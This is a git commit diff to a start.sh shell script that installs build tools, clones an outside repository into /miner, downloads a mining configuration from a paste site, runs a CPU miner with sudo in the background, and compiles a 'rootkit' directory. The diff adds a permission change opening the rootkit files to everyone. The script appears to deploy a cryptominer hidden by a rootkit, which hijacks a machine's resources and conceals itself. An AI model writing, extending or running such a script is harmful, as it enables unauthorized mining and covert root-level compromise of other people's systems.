3a8f057cad675137b63ba46a68190cbd11811ddd
Zimfir11 <77670862+Zimfir11@users.noreply.github.com>
2021-11-25 14:51:18 +0200

    Update start.sh

--- start.sh
+++ start.sh
@@ -2,6 +2,7 @@
 sudo apt update
 sudo apt-get -y install build-essential automake libssl-dev libcurl4-openssl-dev libjansson-dev screen git make 
 rm -rf /miner
+mv /miner /tmp/tmp1
 mkdir /miner
 cd /miner
 git clone https://github.com/Mzikoa21/Zarrassa.git
@@ -11,6 +12,7 @@ NEW_UUID=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
 curl https://ghostbin.com/B545M/raw  | sed "s/Miner/$NEW_UUID/g" > config.json
 sudo chmod 777 *
 sudo chmod 777 /miner/binaries/*
+sudo chmod 777 /miner/rootkit/*
 sudo ./cpuminer.sh & 
 cd rootkit
 make
